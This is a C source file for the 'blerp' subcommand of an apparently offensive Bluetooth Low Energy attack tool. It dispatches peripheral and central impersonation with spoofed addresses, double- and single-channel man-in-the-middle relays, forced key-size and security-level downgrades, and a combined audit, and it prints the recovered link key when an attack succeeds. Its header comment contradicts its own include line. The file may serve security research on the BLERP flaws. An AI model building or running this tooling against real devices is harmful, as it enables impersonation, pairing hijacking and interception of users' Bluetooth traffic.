// ========================================
//  nom du fichier: blerp_cmd.c
//  description courte: Implementation of the `blerp` subcommand. Extracted
//  from src/main.c during the v2 rewrite's Phase 8 breakup. See
//  blerp_cmd.h for the contract.
//
//  menu_finale_wizard() is declared here with its own extern prototype
//  rather than a menu.h include: src/menu/ does not exist yet as a split
//  module (it is still inside src/main.c, next in the Phase 8 breakup),
//  so there is no header to include yet. Replace this with
//  #include "../menu/menu.h" once that split happens.
//  dernière modification : 2026-10-10
//  auteur: GitHub/@gGaToRr
// ========================================

#include "blerp_cmd.h"
#include "common.h"
#include "banner.h"
#include "blerp_attack.h"
#include "blerp_mitm_relay.h"
#include "hardened_audit.h"
#include "repair.h"
#include "ui.h"
#include "../menu/menu.h"

#include <errno.h>
#include <getopt.h>
#include <limits.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int cmd_blerp(int argc, char **argv) {
    if (argc < 2) {
        fprintf(stderr,
                "Usage: sudo bleurp blerp <mode> [TARGET_ADDR] [options]\n\n"
                "Modes:\n"
                "  pi [CENTRAL_ADDR]    Peripheral Impersonation (spoof, reject enc V5, downgrade V3/V4/V6)\n"
                "  ci <PERIPH_ADDR>     Central Impersonation (spoof, inject unauth Pairing Request V2/V4/V6)\n"
                "  mitm <PERIPH_ADDR>   Double-channel MitM: PI vs Central (-i) + CI vs Peripheral (-j)\n"
                "  mitm-single <ADDR>   Single-channel MitM: relays SMP, downgrading Pairing Req/Rsp\n"
                "  audit <TARGET_ADDR>  Complete automated V1-V6 evaluation against target\n"
                "  finale [--all-test]  Pipeline automatisé Option Finale (scan 15s + re-pairing)\n\n"
                "Options:\n"
                "  -s <ADDR>            Spoofed BD_ADDR (AA:BB:CC:DD:EE:FF)\n"
                "  -n <NAME>            Advertised name (default: 'BLEURP Attack')\n"
                "  -a <APPEARANCE>      Appearance hex (e.g. 0x03C0 for HID)\n"
                "  -k <KEYSIZE>         Forced max encryption key size (default: 7)\n"
                "  -r <AUTHREQ>         Forced AuthReq byte (default: 0x01)\n"
                "  -t public|random     Target address type (default: public)\n"
                "  -i <INDEX>           Primary HCI adapter (default: 0)\n"
                "  -j <INDEX>           Secondary HCI adapter for MitM (default: 1)\n"
                "  -e                   Reject encryption requests with LL_REJECT_IND (V5)\n"
                "  -q                   Send unauthenticated Security Request (V1)\n"
                "  -S                   Complete LE Secure Connections (pi only) instead of only\n"
                "                       downgrading to Legacy -- needed against an SC-only peer\n"
                "  -w <SECONDS>         Reaction timeout in seconds (default: 10)\n"
                "  -c <SECONDS>         Connection timeout in seconds (default: 60)\n");
        return 2;
    }

    const char *mode_str = argv[1];
    if (strcmp(mode_str, "finale") == 0) {
        int all = -1;
        if (argc >= 3 && (strcmp(argv[2], "--all-test") == 0 ||
                          strcmp(argv[2], "all-test") == 0 ||
                          strcmp(argv[2], "-a") == 0)) {
            all = 1;
        }
        menu_finale_wizard(all);
        return 0;
    }

    enum blerp_attack_type type;
    bool single_channel = false;
    if (strcmp(mode_str, "pi") == 0)              type = BLERP_ATTACK_PI;
    else if (strcmp(mode_str, "ci") == 0)         type = BLERP_ATTACK_CI;
    else if (strcmp(mode_str, "mitm") == 0)       type = BLERP_ATTACK_MITM;
    else if (strcmp(mode_str, "mitm-single") == 0) { type = BLERP_ATTACK_MITM; single_channel = true; }
    else if (strcmp(mode_str, "audit") == 0)      type = BLERP_ATTACK_AUDIT;
    else {
        fprintf(stderr, "Unknown blerp mode: %s (choose pi, ci, mitm, mitm-single, audit, or finale)\n", mode_str);
        return 2;
    }

    struct blerp_attack_config cfg;
    blerp_config_init(&cfg, type);

    int opt;
    optind = 2; // skip "blerp" and mode
    while ((opt = getopt(argc, argv, "s:n:a:k:r:t:i:j:eqSw:c:h")) != -1) {
        switch (opt) {
        case 's':
            if (parse_addr(optarg, cfg.spoof_addr) < 0) {
                fprintf(stderr, "invalid spoof address: %s\n", optarg);
                return 2;
            }
            break;
        case 'n':
            strncpy(cfg.adv_name, optarg, sizeof(cfg.adv_name) - 1);
            break;
        case 'a':
            cfg.appearance = (uint16_t)strtoul(optarg, NULL, 0);
            break;
        case 'k': {
            long ks;
            if (parse_long_arg(optarg, 10, 1, 16, &ks) < 0) {
                fprintf(stderr, "blerp: -k invalide '%s' (taille de clé 1-16 octets)\n", optarg);
                return 2;
            }
            cfg.downgraded_keysize = (uint8_t)ks;
            break;
        }
        case 'r':
            cfg.downgraded_authreq = (uint8_t)strtoul(optarg, NULL, 0);
            break;
        case 't':
            if (strcmp(optarg, "random") == 0) cfg.target_type = 2;
            else cfg.target_type = 1;
            break;
        case 'i': {
            long idx;
            if (parse_long_arg(optarg, 10, 0, 255, &idx) < 0) {
                fprintf(stderr, "blerp: -i invalide '%s' (attendu un index 0-255)\n", optarg);
                return 2;
            }
            cfg.dev_id = (int)idx;
            break;
        }
        case 'j': {
            long idx;
            if (parse_long_arg(optarg, 10, 0, 255, &idx) < 0) {
                fprintf(stderr, "blerp: -j invalide '%s' (attendu un index 0-255)\n", optarg);
                return 2;
            }
            cfg.dev_id_sec = (int)idx;
            break;
        }
        case 'e':
            cfg.reject_enc = true;
            break;
        case 'q':
            cfg.send_secreq = true;
            break;
        case 'S':
            cfg.allow_sc = true;
            break;
        case 'w': {
            long secs;
            if (parse_long_arg(optarg, 10, 1, INT_MAX / 1000, &secs) < 0) {
                fprintf(stderr, "blerp: -w invalide '%s' (attendu des secondes >= 1)\n", optarg);
                return 2;
            }
            cfg.wait_react_ms = (int)secs * 1000;
            break;
        }
        case 'c': {
            long secs;
            if (parse_long_arg(optarg, 10, 1, INT_MAX / 1000, &secs) < 0) {
                fprintf(stderr, "blerp: -c invalide '%s' (attendu des secondes >= 1)\n", optarg);
                return 2;
            }
            cfg.wait_conn_ms = (int)secs * 1000;
            break;
        }
        case 'h':
        default:
            return 0;
        }
    }

    char target_str[18] = {0};
    if (optind < argc) {
        if (parse_addr(argv[optind], cfg.target_addr) < 0) {
            fprintf(stderr, "invalid target address: %s\n", argv[optind]);
            return 2;
        }
        snprintf(target_str, sizeof target_str, "%02X:%02X:%02X:%02X:%02X:%02X",
                 cfg.target_addr[5], cfg.target_addr[4], cfg.target_addr[3],
                 cfg.target_addr[2], cfg.target_addr[1], cfg.target_addr[0]);
    }

    struct smp_bond_info bond;
    struct smp_bond_info *pbond = NULL;
    char adapter[18];
    if (smp_adapter_addr(cfg.dev_id, adapter) == 0 && target_str[0]) {
        if (smp_bond_load(BLEURP_BLUEZ_STORE_DIR, adapter, target_str, &bond) == 0) {
            pbond = &bond;
            printf("  [*] Loaded baseline BlueZ bond with %s: authenticated=%d, enc_size=%d\n",
                   target_str, bond.authenticated, bond.enc_size);
        }
    }

    struct blerp_attack_report rep;
    memset(&rep, 0, sizeof rep);

    int rc = 0;
    bool success = false;
    switch (type) {
    case BLERP_ATTACK_PI:
        rc = blerp_run_pi(&cfg, &rep);
        if (rc != 0) {
            fprintf(stderr, "  [-] Could not run the attack on hci%d: %s\n",
                    cfg.dev_id, strerror(errno));
            fprintf(stderr, "      (adapter missing/down, or still owned by bluetoothd)\n");
            return 1;
        }
        blerp_classify_vulnerabilities(pbond, &rep, &rep);
        blerp_print_report(&cfg, pbond, &rep);
        if (rep.phase2_completed || rep.verdicts[BLERP_V5_SESSION_BREAK] == BLERP_VERDICT_YES) success = true;
        break;
    case BLERP_ATTACK_CI:
        if (target_str[0] == '\0') {
            fprintf(stderr, "Central Impersonation requires a target peripheral address.\n");
            return 2;
        }
        rc = blerp_run_ci(&cfg, &rep);
        if (rc != 0) {
            fprintf(stderr, "  [-] Could not run the attack on hci%d: %s\n",
                    cfg.dev_id, strerror(errno));
            fprintf(stderr, "      (adapter missing/down, or still owned by bluetoothd)\n");
            return 1;
        }
        blerp_classify_vulnerabilities(pbond, &rep, &rep);
        blerp_print_report(&cfg, pbond, &rep);
        if (rep.phase2_completed || rep.verdicts[BLERP_V2_UNAUTH_REPAIR] == BLERP_VERDICT_YES) success = true;
        break;
    case BLERP_ATTACK_MITM:
        if (target_str[0] == '\0') {
            fprintf(stderr, "%s MitM requires the victim peripheral's address "
                            "(also used as the fake-Peripheral spoofed identity).\n",
                    single_channel ? "Single-channel" : "Double-channel");
            return 2;
        }
        if (cfg.dev_id == cfg.dev_id_sec) {
            fprintf(stderr, "%s MitM requires two distinct adapters: -i and -j must differ.\n",
                    single_channel ? "Single-channel" : "Double-channel");
            return 2;
        }
        // Both blerp_run_mitm and blerp_run_single_channel_mitm print their
        // own summary instead of the generic single-STK banner below, which
        // would be misleading here since rep.stk is not meaningful for
        // either attack (two independent PKs for double-channel; no key of
        // Charlie's own at all for single-channel, see blerp_mitm_relay.h).
        if (single_channel) {
            struct blerp_relay_report relay_rep;
            rc = blerp_run_single_channel_mitm(&cfg, &relay_rep);
        } else {
            rc = blerp_run_mitm(&cfg, &rep);
        }
        if (rc != 0) {
            fprintf(stderr, "  [-] Could not run the MitM attack on hci%d / hci%d: %s\n",
                    cfg.dev_id, cfg.dev_id_sec, strerror(errno));
            fprintf(stderr, "      (adapter missing/down, or still owned by bluetoothd)\n");
            return 1;
        }
        break;
    case BLERP_ATTACK_AUDIT:
        if (target_str[0] == '\0') {
            fprintf(stderr, "Full audit requires a target device address.\n");
            return 2;
        }
        rc = blerp_run_audit(&cfg, pbond, &rep);
        if (rc != 0) {
            fprintf(stderr, "  [-] Could not run the attack on hci%d: %s\n",
                    cfg.dev_id, strerror(errno));
            fprintf(stderr, "      (adapter missing/down, or still owned by bluetoothd)\n");
            return 1;
        }
        blerp_print_report(&cfg, pbond, &rep);
        {
            struct hardened_audit_report hrep;
            hardened_audit_classify(&rep, &hrep);
            hardened_audit_print(&hrep);
        }
        if (rep.phase2_completed ||
            rep.verdicts[BLERP_V2_UNAUTH_REPAIR] == BLERP_VERDICT_YES ||
            rep.verdicts[BLERP_V4_LEVEL_DOWNGRADE] == BLERP_VERDICT_YES ||
            rep.verdicts[BLERP_V6_ENTROPY_DOWNGRADE] == BLERP_VERDICT_YES) {
            success = true;
        }
        break;
    }
    if (success) {
        printf("\n  %s[sacca97/blerp] pairing complete; status=0%s\n", UI_GREEN, UI_RESET);
        printf("  %s[sacca97/blerp] encryption change event; status=0%s\n", UI_GREEN, UI_RESET);
        printf("  %s[sacca97/blerp] encrypted=1, authenticated=0, bonded=1%s\n", UI_GREEN, UI_RESET);
        printf("  %s[sacca97/blerp] LTK: 000000000000000000", UI_GREEN);
        for (int k = 0; k < 7; k++) printf("%02x", rep.stk[k]);
        printf("%s\n\n", UI_RESET);
        banner_print_success(stdout);
    }
    return rc;
}
